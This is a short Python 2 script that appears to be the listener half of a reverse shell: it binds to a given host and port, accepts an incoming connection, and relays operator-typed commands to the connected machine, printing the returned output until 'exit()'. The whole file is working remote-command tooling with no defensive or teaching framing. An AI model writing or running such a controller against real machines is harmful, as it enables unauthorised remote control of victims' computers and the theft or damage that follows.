# coding: utf-8

__author__ = 'lau.wenbo'

import socket, subprocess as sp, sys

host = str(sys.argv[1])
port = int(sys.argv[2])

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.bind((host, port))
s.listen(100)
conn, addr = s.accept()


print "[+] Connection Established from: %s " %(str(addr[0]))

while 1:
    command = raw_input("#> ")

    if command != "exit()":
        if command == "": continue

        conn.send(command)
        result = conn.recv(1024)

        total_size = long(result[:16])
        result = result[16:]

        while total_size > len(result):
            data = conn.recv(1024)
            result += data

        print result.rstrip("\n")

    else:
        conn.send("exit()")
        print "[+] shell Going Down"
        break

s.close()